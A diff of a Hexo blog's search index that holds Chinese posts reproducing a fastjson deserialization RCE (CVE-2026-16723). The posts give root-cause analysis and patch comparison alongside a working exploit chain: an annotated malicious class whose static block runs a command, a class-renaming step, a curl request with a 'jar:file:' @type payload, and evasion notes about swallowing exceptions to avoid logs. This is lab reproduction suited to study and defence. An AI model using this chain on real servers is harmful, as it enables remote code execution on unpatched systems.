@@ -1,6 +1,18 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>你好，博客</title>
+    <url>/2026/11/05/%E7%94%9F%E6%B4%BB/hello-blog/</url>
+    <content><![CDATA[<p>这是第一篇文章。博客用 Hexo 8 + NexT 8 搭成，纯静态，托管在云端，不需要服务器。</p>
+]]></content>
+      <categories>
+        <category>生活</category>
+      </categories>
+      <tags>
+        <tag>随笔</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>使用说明</title>
     <url>/2026/11/06/%E7%94%9F%E6%B4%BB/%E4%BD%BF%E7%94%A8%E8%AF%B4%E6%98%8E/</url>
     <content><![CDATA[<h1 id="博客使用说明"><a href="#博客使用说明" class="headerlink" title="博客使用说明"></a>博客使用说明</h1><p>Hexo 8 + NexT 8（Gemini 主题）静态博客，已配好站内搜索、分类&#x2F;标签、归档、RSS、sitemap、阅读进度、代码复制按钮、深色模式、手机自适应、推送即上线。</p>
@@ -21,7 +33,7 @@
 </tr>
 <tr>
 <td>仓库</td>
-<td><a href="mailto:&#x67;&#105;&#x74;&#x40;&#103;&#x69;&#116;&#x68;&#117;&#98;&#46;&#99;&#x6f;&#x6d;">&#x67;&#105;&#x74;&#x40;&#103;&#x69;&#116;&#x68;&#117;&#98;&#46;&#99;&#x6f;&#x6d;</a>:qincaidunxueli&#x2F;my-blog.git（<code>main</code>）</td>
+<td><a href="mailto:&#103;&#105;&#116;&#x40;&#103;&#x69;&#x74;&#104;&#x75;&#98;&#x2e;&#x63;&#111;&#x6d;">&#103;&#105;&#116;&#x40;&#103;&#x69;&#x74;&#104;&#x75;&#98;&#x2e;&#x63;&#111;&#x6d;</a>:qincaidunxueli&#x2F;my-blog.git（<code>main</code>）</td>
 </tr>
 <tr>
 <td>部署</td>
@@ -599,653 +611,261 @@
       </tags>
   </entry>
   <entry>
-    <title>你好，博客</title>
-    <url>/2026/11/05/%E7%94%9F%E6%B4%BB/hello-blog/</url>
-    <content><![CDATA[<p>这是第一篇文章。博客用 Hexo 8 + NexT 8 搭成，纯静态，托管在云端，不需要服务器。</p>
-]]></content>
-      <categories>
-        <category>生活</category>
-      </categories>
-      <tags>
-        <tag>随笔</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>CVE-2026-16723 复现总结</title>
-    <url>/2026/11/08/%E6%8A%80%E6%9C%AF/JAVA%E5%AE%89%E5%85%A8/Fastjson/SUMMARY/</url>
-    <content><![CDATA[<p><strong>简单说明该漏洞成因</strong>：Fastjson 在判断 <code>@type</code> 是否可信时，把用户可控的这个字符串当作“资源名”交给 <code>URLClassLoader</code> 读取——由于 <code>URLClassLoader</code> 会把它当成 URL 打开，攻击者写一个 <code>jar:file:</code> 路径就能让目标加载自己提供的类，类的静态代码块随即可执行</p>
-<p><strong>简单说明怎么利用的</strong>：一句话：<strong>在目标磁盘上放一个“加了 <code>@JSONType</code> 注解、静态块里写命令”的 jar，然后发一个 <code>@type</code> 指向它的 JSON</strong>。</p>
-<p>四步：</p>
-<p><strong>1. 写一个类</strong></p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@JSONType</span>                                    <span class="comment">// ← 白名单通行证，必须有</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Evil</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;                                 <span class="comment">// ← 类初始化时自动执行</span></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(<span class="string">&quot;calc.exe&quot;</span>).start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p><strong>2. 编译并改名，打成 jar</strong></p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">javac --release 8 -<span class="built_in">cp</span> fastjson-1.2.83.jar -d . Evil.java</span><br><span class="line">python patch_name.py Evil.class <span class="string">&#x27;jar:file:/C:/fj/f!/Evil&#x27;</span> Evil.class   <span class="comment"># 改 this_class</span></span><br><span class="line">jar cf payload.jar Evil.class &amp;&amp; <span class="built_in">cp</span> payload.jar /c/fj/f</span><br></pre></td></tr></table></figure>
-
-<p>改名是因为 JVM 要求“请求的类名”和 class 自己声明的名字逐字相同，而 fastjson 传进去的是 <code>jar:file:/C:/fj/f!/Evil</code> 这种带 <code>:</code> <code>!</code> 的名字。</p>
-<p><strong>3. 让这个 jar 落到目标机器上</strong>（上传接口、临时目录、共享缓存都行；演示时直接放 <code>C:\fj\f</code>）</p>
-<p><strong>4. 发一个请求</strong></p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -X POST http://target/parse -H <span class="string">&#x27;Content-Type: application/json&#x27;</span> \</span><br><span class="line">  -d <span class="string">&#x27;&#123;&quot;@type&quot;:&quot;jar:file:.C:.fj.f!.Evil&quot;&#125;&#x27;</span></span><br></pre></td></tr></table></figure>
-
-<p>注意 <code>@type</code> 里用<strong>点代替斜杠</strong>，因为 fastjson 会把点换成 <code>/</code>，还原后正好是 <code>jar:file:/C:/fj/f</code>。</p>
-<p>然后目标 JVM 就会：把这个字符串当 URL 打开 → 读到你的 class → 扫到 <code>@JSONType</code> 判定可信 → <code>defineClass</code> 定义它 → <code>&lt;clinit&gt;</code> 执行 → 弹出计算器。</p>
-<p><strong>判断成功别看返回体</strong>，看副作用：计算器进程、证明文件的 mtime。<code>ok:true</code> 只代表“类加载成功”，同一个类名第二次打会命中缓存、不会重新执行。</p>
-<p><strong>唯一的前提</strong>（也是唯一要说清的限制）：第 3 步的 jar 必须先到目标磁盘上。远程 <code>jar:http://</code> 打不到 <code>defineClass</code>，因为类名里会出现 <code>//</code>，JVM 直接拒绝。</p>
-<span id="more"></span>
-<h1 id="CVE-2026-16723-复现总结"><a href="#CVE-2026-16723-复现总结" class="headerlink" title="CVE-2026-16723 复现总结"></a>CVE-2026-16723 复现总结</h1><p>fastjson 1.2.68 ~ 1.2.83 · 默认配置反序列化 RCE · CVSS 9.0 · 1.2.84 修复</p>
-<blockquote>
-<p>本文所有结论都在本机（Windows 10 &#x2F; JDK 8u66）与 Ubuntu 虚机（JDK 17）上实测过，<br>报错原文、字节数、返回字段均为实测值，不是从公告里抄的。</p>
+    <title>CVE-2026-16723：载荷（payload）构造</title>
+    <url>/2026/11/10/%E6%8A%80%E6%9C%AF/JAVA%E5%AE%89%E5%85%A8/Fastjson/PAYLOAD/</url>
+    <content><![CDATA[<h1 id="CVE-2026-16723：载荷（payload）构造"><a href="#CVE-2026-16723：载荷（payload）构造" class="headerlink" title="CVE-2026-16723：载荷（payload）构造"></a>CVE-2026-16723：载荷（payload）构造</h1><blockquote>
+<p>配套文档：<code>SOURCE.md</code>（fastjson 1.2.83 源码注解）。本文件只讲载荷本身。<br>实测环境：Spring Boot fat-JAR + fastjson 1.2.83，JDK 8u66；载荷 class 585 字节，jar 533 字节。</p>
 </blockquote>
-<p><strong>阅读顺序</strong>：前置（要准备什么）→ 1（这洞是什么、凭什么能打）→ 2（payload 怎么造）→ 3（怎么一步步复现）。</p>
 <hr>
-<h1 id="前置：复现这个漏洞需要什么"><a href="#前置：复现这个漏洞需要什么" class="headerlink" title="前置：复现这个漏洞需要什么"></a>前置：复现这个漏洞需要什么</h1><h2 id="0-1-一句话"><a href="#0-1-一句话" class="headerlink" title="0.1 一句话"></a>0.1 一句话</h2><p><strong>一台能跑 Java 的机器 + 一个用漏洞版本 fastjson 的 Web 应用 + 一个按目标路径定制好的 class 文件。</strong><br>不需要外网、不需要 Docker、不需要数据库、不需要中间件、不需要任何 gadget。</p>
-<h2 id="0-2-软硬件清单"><a href="#0-2-软硬件清单" class="headerlink" title="0.2 软硬件清单"></a>0.2 软硬件清单</h2><table>
-<thead>
-<tr>
-<th>项目</th>
-<th>要求</th>
-<th>说明</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>操作系统</td>
-<td>Windows 10&#x2F;11 或 Ubuntu 20.04+</td>
-<td>两条路都实测打通</td>
-</tr>
-<tr>
-<td>JDK</td>
-<td>8 &#x2F; 11 &#x2F; 17 &#x2F; 21 任一</td>
-<td>实测 8u66、17.0.20、21.0.10 均可</td>
-</tr>
-<tr>
-<td>内存</td>
-<td>512 MB 空闲</td>
-<td>应用本体是 18 MB 的 fat-JAR</td>
-</tr>
-<tr>
-<td>编译工具</td>
-<td>任一 <code>javac</code> + <code>jar</code></td>
-<td>必须支持 <code>--release 8</code>；JDK 21 的 javac 也行</td>
-</tr>
-<tr>
-<td>运行时工具</td>
-<td><code>curl</code>；<code>python3</code>（改类名用）</td>
-<td>Ubuntu 缺 curl：<code>sudo apt install curl</code></td>
-</tr>
-<tr>
-<td>外网</td>
-<td><strong>不需要</strong></td>
-<td>全程走 <code>127.0.0.1</code></td>
-</tr>
-<tr>
-<td>Docker &#x2F; 数据库 &#x2F; MQ</td>
-<td><strong>不需要</strong></td>
-<td>裸 JVM 直接跑</td>
-</tr>
-</tbody></table>
-<h2 id="0-3-四个技术前提（缺一不可）"><a href="#0-3-四个技术前提（缺一不可）" class="headerlink" title="0.3 四个技术前提（缺一不可）"></a>0.3 四个技术前提（缺一不可）</h2><table>
-<thead>
-<tr>
-<th>#</th>
-<th>前提</th>
-<th>怎么确认</th>
-<th>不满足的表现</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>1</td>
-<td>fastjson 在 <strong>1.2.68 ~ 1.2.83</strong></td>
-<td><code>mvn dependency:tree | grep fastjson</code></td>
-<td>1.2.84+ 直接 <code>autoType is not support</code></td>
-</tr>
-<tr>
-<td>2</td>
-<td>默认 classloader 是 <strong><code>URLClassLoader</code> 家族</strong></td>
-<td><code>/status</code> 的 <code>launchedBy</code> 字段</td>
-<td><code>stream=false</code>，链断在读取第一步</td>
-</tr>
-<tr>
-<td>3</td>
-<td><strong>没开 SafeMode</strong>，不是 <code>noneautotype</code> 构建</td>
-<td><code>/status</code> 的 <code>safeMode</code> 字段</td>
-<td>探测请求都发不出去</td>
-</tr>
-<tr>
-<td>4</td>
-<td>有接口把请求体交给 <strong><code>JSON.parse</code></strong></td>
-<td>看业务代码</td>
-<td>根本进不了 <code>checkAutoType</code></td>
-</tr>
-</tbody></table>
-<p><strong>第 2 条是绝大多数复现失败的真正原因。</strong> Spring Boot fat-JAR 的 <code>LaunchedURLClassLoader</code> 是 <code>URLClassLoader</code> 子类，<code>java -jar</code> 启动天然满足；但某些部署形态拿到的是普通 <code>AppClassLoader</code>，同一个 payload 就是 <code>stream=false</code>。</p>
-<h2 id="0-4-需要准备的四个文件"><a href="#0-4-需要准备的四个文件" class="headerlink" title="0.4 需要准备的四个文件"></a>0.4 需要准备的四个文件</h2><table>
-<thead>
-<tr>
-<th>文件</th>
-<th>作用</th>
-<th>本项目位置</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>靶场应用（漏洞版）</td>
-<td>被打的那一方</td>
-<td><code>out/app-vuln-1.2.83.jar</code></td>
-</tr>
-<tr>
-<td>payload 的 Java 源码</td>
-<td>要执行的代码</td>
-<td><code>payload/windows/Evil.java</code></td>
-</tr>
-<tr>
-<td>改类名脚本</td>
-<td>让 class 自称 <code>jar:file:.../Evil</code></td>
-<td><code>payload/patch_name.py</code></td>
-</tr>
-<tr>
-<td>对照应用（修复版）</td>
-<td>证明”同一 payload 打不动”</td>
-<td><code>out/app-fixed-1.2.84.jar</code></td>
-</tr>
-</tbody></table>
-<h2 id="0-5-这些都不需要（常见误解）"><a href="#0-5-这些都不需要（常见误解）" class="headerlink" title="0.5 这些都不需要（常见误解）"></a>0.5 这些都不需要（常见误解）</h2><ul>
-<li>不需要 <code>autoTypeSupport=true</code>——默认 <code>false</code> 照样打穿，这是本漏洞最反直觉的地方；</li>
-<li>不需要 classpath 上有 CommonsCollections &#x2F; JdbcRowSetImpl 之类 gadget；</li>
-<li>不需要目标能出网——<code>jar:file:</code> 形态完全离线；</li>
-<li>不需要 <code>/proc/self/fd</code>——那是”jar 只存在于进程 fd 上”时的补充路径，本次未用到。</li>
-</ul>
-<h2 id="0-6-三种部署形态，三种能力"><a href="#0-6-三种部署形态，三种能力" class="headerlink" title="0.6 三种部署形态，三种能力"></a>0.6 三种部署形态，三种能力</h2><table>
-<thead>
-<tr>
-<th>形态</th>
-<th>环境要求</th>
-<th>能做到</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>单机自打</td>
-<td>一台机器</td>
-<td>全链贯通，代码执行</td>
-</tr>
-<tr>
-<td>跨机（攻击机 + 靶机同网段）</td>
-<td>靶机端口可达</td>
-<td>全链贯通，效果最真实</td>
-</tr>
-<tr>
-<td>纯远程（只有 HTTP 可达）</td>
-<td>无需接触目标磁盘</td>
-<td>只能到 SSRF + 信任伪造，<strong>打不到 <code>defineClass</code></strong></td>
-</tr>
-</tbody></table>
-<p>第三种形态的天花板是漏洞本身决定的，第 1.4 节解释原因。</p>
+<h2 id="1-载荷是什么"><a href="#1-载荷是什么" class="headerlink" title="1. 载荷是什么"></a>1. 载荷是什么</h2><p>一个<strong>自己写的 Java 类</strong>，装进 jar，落到目标磁盘上。攻击者发的那条 JSON 里只有一段路径，没有代码：</p>
+<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;jar:file:.C:.fj.uploads.p!.Evil&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>真正被执行的字节，全部在那个文件里。这是本漏洞和传统反序列化最大的不同——<strong>武器不随请求走</strong>。</p>
+<p>原因（<code>SOURCE.md</code> 6.4 有细节）：远程 <code>jar:http://</code> 形态走不到 <code>defineClass</code>，点号还原后类名里会出现 <code>//</code>，JVM 直接 <code>ClassFormatError</code>。所以必须先落地，再触发。</p>
 <hr>
-<h1 id="1-这个漏洞是什么"><a href="#1-这个漏洞是什么" class="headerlink" title="1. 这个漏洞是什么"></a>1. 这个漏洞是什么</h1><h2 id="1-1-一条-JSON-变成代码执行"><a href="#1-1-一条-JSON-变成代码执行" class="headerlink" title="1.1 一条 JSON 变成代码执行"></a>1.1 一条 JSON 变成代码执行</h2><p>正常反序列化请求：</p>
-<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;name&quot;</span><span class="punctuation">:</span><span class="string">&quot;tom&quot;</span><span class="punctuation">,</span><span class="attr">&quot;age&quot;</span><span class="punctuation">:</span><span class="number">18</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+<h2 id="2-载荷源码（带注解）"><a href="#2-载荷源码（带注解）" class="headerlink" title="2. 载荷源码（带注解）"></a>2. 载荷源码（带注解）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ===========================================================================</span></span><br><span class="line"><span class="comment">// CVE-2026-16723  最小载荷（逐行注解版）</span></span><br><span class="line"><span class="comment">// 编译：javac --release 8 -nowarn -d classes Evil.java JSONType.java</span></span><br><span class="line"><span class="comment">// 硬性要求：字节码版本必须是 52（Java 8），不要用 --release 11 及以上</span></span><br><span class="line"><span class="comment">// ===========================================================================</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.annotation.JSONType;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 这个类没有 main 方法，也不会被任何人 new 出来用。</span></span><br><span class="line"><span class="comment"> * 它整条生命周期的驱动力都来自 fastjson：</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *   读字节  -&gt;  ParserConfig.java:1484  getResourceAsStream(resource)</span></span><br><span class="line"><span class="comment"> *   判可信  -&gt;  ParserConfig.java:1492  visitor.hasJsonType()</span></span><br><span class="line"><span class="comment"> *   定义类  -&gt;  TypeUtils.java:1761     defineClass(name, bytes, 0, len)</span></span><br><span class="line"><span class="comment"> *   初始化  -&gt;  JVM 在&quot;首次主动使用&quot;时执行 &lt;clinit&gt;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 承重结构只有三处，其中两处在源码里、一处在字节里：</span></span><br><span class="line"><span class="comment"> *   [1] 类级注解 <span class="doctag">@JSONType</span>   -&gt; 让 TypeCollector 把 jsonType 置为 true      （源码里）</span></span><br><span class="line"><span class="comment"> *   [2] static &#123; &#125; 静态块    -&gt; 让 JVM 在类初始化时自动执行                  （源码里）</span></span><br><span class="line"><span class="comment"> *   [3] this_class 类名      -&gt; 让 defineClass 的命名校验通过                （字节里，脚本改写）</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 缺任何一处，链条都会断在某一环。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@JSONType</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Evil</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="comment">// &lt;clinit&gt;：JVM 在初始化这个类时执行，早于任何构造方法。</span></span><br><span class="line">        <span class="comment">// fastjson 拿到 Class 之后会立刻实例化，所以这一段必然被触发；</span></span><br><span class="line">        <span class="comment">// 反过来，即使目标类没有无参构造、后续反序列化抛错，静态块也已经跑完了。</span></span><br><span class="line">        <span class="comment">// 这就是把恶意逻辑放静态块、而不是放构造方法的原因。</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// RCE 的全部内容：一次普通的进程创建调用。</span></span><br><span class="line">            <span class="comment">// 没有任何 fastjson API，没有任何反射，JDK 自带即可。</span></span><br><span class="line">            <span class="comment">// 换成 &quot;cmd.exe /c whoami&quot;、&quot;/bin/sh -c id&quot; 效果相同。</span></span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(<span class="string">&quot;calc.exe&quot;</span>).start();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception ignored) &#123;</span><br><span class="line">            <span class="comment">// 真实攻击里也会吞掉异常：不让目标日志留下堆栈，减少被发现的机会。</span></span><br><span class="line">            <span class="comment">// 顺带一提，fastjson 自己也是这么干的（ParserConfig 1494 行 catch 后什么都不记）。</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<p>fastjson 允许在 JSON 里写 <code>@type</code>，声明”这段数据还原成哪个类”：</p>
-<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.example.User&quot;</span><span class="punctuation">,</span><span class="attr">&quot;name&quot;</span><span class="punctuation">:</span><span class="string">&quot;tom&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
-
-<p>问题就在这个 <code>@type</code> 上。它语义上应该是<strong>一个类名</strong>，但 fastjson 在处理它之前会先拿这个字符串去**查”有没有对应的 class 文件”**，用来判断类型是否可信。</p>
-<p>而这个”查”用的是 <code>ClassLoader.getResourceAsStream(name)</code>。对 <code>URLClassLoader</code> 来说，<code>name</code> 不一定是类路径，<strong>它可以是 URL</strong>。</p>
-<p>于是：</p>
-<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;jar:file:.C:.fj.f!.Evil&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
-
-<p>目标进程会去打开 <code>jar:file:/C:/fj/f</code>，取出里面 <code>Evil.class</code> 的字节，用 ASM 扫到 <code>@JSONType</code> 注解，判定”这是可信类型”，然后定义它、实例化它——<strong>静态初始化块随之执行，代码就跑起来了。</strong></p>
-<h2 id="1-2-与-1-2-68-之前漏洞的最大区别"><a href="#1-2-与-1-2-68-之前漏洞的最大区别" class="headerlink" title="1.2 与 1.2.68 之前漏洞的最大区别"></a>1.2 与 1.2.68 之前漏洞的最大区别</h2><p>fastjson 的漏洞史可以一刀切成两段，分界线正好是 <strong>1.2.68</strong>，也就是本漏洞的引入版本。</p>
-<table>
-<thead>
-<tr>
-<th>维度</th>
-<th>≤ 1.2.67（AutoType 绕过家族）</th>
-<th>1.2.68 ~ 1.2.83（本漏洞）</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>漏洞性质</td>
-<td>检查逻辑被<strong>绕过</strong>（bypass）</td>
-<td>检查逻辑被<strong>当成加载器使用</strong>（injection）</td>
-</tr>
-<tr>
-<td>攻击者要解决的问题</td>
-<td>找一个 classpath 上已有、且能触发危险动作的类</td>
-<td>自己写一个类，不需要任何 gadget</td>
-</tr>
-<tr>
-<td>攻击者控制的对象</td>
-<td><strong>选哪个类</strong>（类名只是数据）</td>
-<td><strong>类的内容本身</strong>（类名即路径，jar 即载荷）</td>
-</tr>
-<tr>
-<td>默认配置</td>
-<td>多数要 <code>autoTypeSupport=true</code>；少数靠缓存绕过可在默认下打</td>
-<td>默认配置即可，实测 <code>autoTypeSupport=false</code> 照样打穿</td>
-</tr>
-<tr>
-<td>第三方依赖</td>
-<td>依赖 gadget 在 classpath（<code>JdbcRowSetImpl</code>、<code>TemplatesImpl</code>，或 mybatis、xbean、shiro 等）</td>
-<td>零依赖，JDK 自带即可</td>
-</tr>
-<tr>
-<td>出网要求</td>
-<td>JNDI 类要求目标能回连攻击者的 LDAP&#x2F;RMI</td>
-<td>完全不出网（<code>jar:file:</code> 本地路径）</td>
-</tr>
-<tr>
-<td>JDK 限制</td>
-<td><code>TemplatesImpl</code> 受 JDK 版本&#x2F;模块限制，高版本常失效</td>
-<td>class 版本对齐即可，实测 8u66 &#x2F; 17 &#x2F; 21 均可</td>
-</tr>
-<tr>
-<td>CVE 形态</td>
-<td><strong>点版本</strong>：1.2.42、1.2.47……每个版本一个绕过</td>
-<td><strong>区间</strong>：同一个设计缺陷贯穿 1.2.68 ~ 1.2.83</td>
-</tr>
-<tr>
-<td>修复手段</td>
-<td>逐个加黑名单、加缓存校验（1.2.25 → 1.2.67 打了十几轮）</td>
-<td>一个字符校验，4 行，拦 <code>:</code> 和 <code>!</code></td>
-</tr>
-<tr>
-<td>流量特征</td>
-<td><code>@type</code> 是已知 gadget 类名</td>
-<td><code>@type</code> 里含 <code>:</code>、<code>!</code>、<code>..</code>、<code>jar:</code>、<code>http:</code></td>
-</tr>
-</tbody></table>
-<p><strong>三条更本质的差异：</strong></p>
-<p><strong>① 载荷从”数据”变成”代码”。</strong> 旧漏洞的 payload 是一段 JSON，它能做什么取决于<strong>目标机器上装了什么</strong>——同一段 JSON 打不同环境成功率天差地别，这也是旧漏洞”复现靠运气”的原因。本漏洞的 payload 是一个 class 文件，<strong>代码由攻击者自己提供</strong>，所以不挑环境、不出网、不挑 JDK。代价是多了个前置：jar 得先落到目标磁盘上。</p>
-<p><strong>② CVE 形态从”点版本”变成”区间”。</strong> 1.2.42、1.2.47 这些 CVE 对应的是”上一个补丁没打全”，所以每个版本一个编号、修完就没了。本漏洞是 1.2.68 引入的一段设计本身有问题，整段版本全部受影响——这也是它 CVSS 9.0 的原因：默认可打、无 gadget、无出网要求，三个传统门槛全被拆掉。</p>
-<p><strong>③ 补丁从”加类名”变成”改语法”。</strong> 旧漏洞的攻击面是”类的集合”，所以黑名单能堵，虽然堵得很累。本漏洞的攻击面是”字符串的语法”——<code>jar:file:</code>、<code>http:</code>、<code>../</code>、<code>/proc/self/fd</code>，路径写法无穷多，黑名单天然堵不住。所以 1.2.84 不是”再加几个类名”，而是<strong>在入口拒绝非法字符</strong>。</p>
-<p><strong>历史脉络</strong>（公开披露的代表性样本，不是完整列表）：1.2.24 及以前 AutoType 默认开启，<code>TemplatesImpl</code> &#x2F; <code>JdbcRowSetImpl</code> 直打；1.2.25 关闭 AutoType 并引入黑名单，此后进入长期补丁战——1.2.25 ~ 1.2.41 的 <code>[</code> 前缀绕过、1.2.42 的 <code>L...;</code>、1.2.43 的 <code>LL...;;</code>、1.2.47 的 <code>java.lang.Class</code> 缓存投毒、1.2.55 ~ 1.2.67 的黑名单扩充。</p>
-<p><strong>为什么 1.2.68 成了分界</strong>：这个版本为了支持 <code>@JSONType</code> 自声明与 SafeMode，在 <code>checkAutoType</code> 里加了”读一下 class 文件、看有没有注解”的探测。设计初衷是让库作者自己标注可信类型，副作用却是把用户可控的 <code>@type</code> 变成了一个<strong>能拼进 URL 的字符串</strong>。修旧漏洞的过程中引入了新原语，这是防御代码最常见的翻车方式。</p>
-<h2 id="1-3-为什么能被利用：一行代码里的四个失误"><a href="#1-3-为什么能被利用：一行代码里的四个失误" class="headerlink" title="1.3 为什么能被利用：一行代码里的四个失误"></a>1.3 为什么能被利用：一行代码里的四个失误</h2><p>漏洞本体在 <code>com.alibaba.fastjson.parser.ParserConfig.checkAutoType()</code>，1.2.83 的 1479–1498 行：</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1479</span>  <span class="type">boolean</span> <span class="variable">jsonType</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line"><span class="number">1480</span>  <span class="type">InputStream</span> <span class="variable">is</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"><span class="number">1481</span>  <span class="keyword">try</span> &#123;</span><br><span class="line"><span class="number">1482</span>      <span class="type">String</span> <span class="variable">resource</span> <span class="operator">=</span> typeName.replace(<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;/&#x27;</span>) + <span class="string">&quot;.class&quot;</span>;</span><br><span class="line"><span class="number">1483</span>      <span class="keyword">if</span> (defaultClassLoader != <span class="literal">null</span>) &#123;</span><br><span class="line"><span class="number">1484</span>          is = defaultClassLoader.getResourceAsStream(resource);</span><br><span class="line"><span class="number">1485</span>      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="number">1486</span>          is = ParserConfig.class.getClassLoader().getResourceAsStream(resource);</span><br><span class="line"><span class="number">1487</span>      &#125;</span><br><span class="line"><span class="number">1488</span>      <span class="keyword">if</span> (is != <span class="literal">null</span>) &#123;</span><br><span class="line"><span class="number">1489</span>          <span class="type">ClassReader</span> <span class="variable">classReader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassReader</span>(is, <span class="literal">true</span>);</span><br><span class="line"><span class="number">1490</span>          <span class="type">TypeCollector</span> <span class="variable">visitor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TypeCollector</span>(<span class="string">&quot;&lt;clinit&gt;&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]);</span><br><span class="line"><span class="number">1491</span>          classReader.accept(visitor);</span><br><span class="line"><span class="number">1492</span>          jsonType = visitor.hasJsonType();</span><br><span class="line"><span class="number">1493</span>      &#125;</span><br><span class="line"><span class="number">1494</span>  &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line"><span class="number">1495</span>      <span class="comment">// skip</span></span><br><span class="line"><span class="number">1496</span>  &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line"><span class="number">1497</span>      IOUtils.close(is);</span><br><span class="line"><span class="number">1498</span>  &#125;</span><br></pre></td></tr></table></figure>
-
-<p>四个失误叠在一起，才构成可利用性：</p>
+<p>三个容易看漏的点：</p>
 <ol>
-<li><strong><code>typeName</code> 没做任何字符校验</strong>，直接拼成资源名（1482）；</li>
-<li><strong>把”资源查找”用在了语义上应该是”类名解析”的地方</strong>——<code>getResourceAsStream</code> 对 <code>URLClassLoader</code> 等于”打开这个 URL”（1484）；</li>
-<li><strong>信任判定只看 class 里有没有 <code>@JSONType</code> 注解，不看这个类从哪来</strong>（1492）；</li>
-<li><strong>异常被 <code>catch (Exception e) { // skip }</code> 静默吞掉</strong>，业务侧完全无感（1494）。</li>
+<li><strong>没有 <code>main</code>，没有 <code>new</code>，没有反射。</strong> 类被初始化即执行，这是 JVM 语义，不是技巧。</li>
+<li><strong><code>static</code> 块优先于构造方法。</strong> 即使后续实例化失败，静态块也已经跑完。</li>
+<li><strong><code>catch</code> 是空的。</strong> 真实攻击不希望目标日志出现堆栈。</li>
 </ol>
-<p>第 4 点让整个探测阶段天然无声：目标已经替你访问了任意地址，日志里却什么都不会留。</p>
-<p><strong>信任信号为什么能被伪造</strong>（<code>asm/TypeCollector</code>，69–72 行）：</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">void</span> <span class="title function_">visitAnnotation</span><span class="params">(String desc)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (JSONType.equals(desc)) &#123;</span><br><span class="line">        jsonType = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>判定规则只有一条：**class 文件的注解表里出现 <code>Lcom/alibaba/fastjson/annotation/JSONType;</code> 这个描述符，就算”可信”**。攻击者在自己类头上写一个 <code>@JSONType</code>，等于给自己发了一张白名单通行证——<code>checkAutoType</code> 拿到 <code>jsonType=true</code> 后，在 1500 行的分支里直接 <code>return clazz</code>，AutoType 黑白名单完全不看。</p>
-<p><strong>完整调用链</strong>：</p>
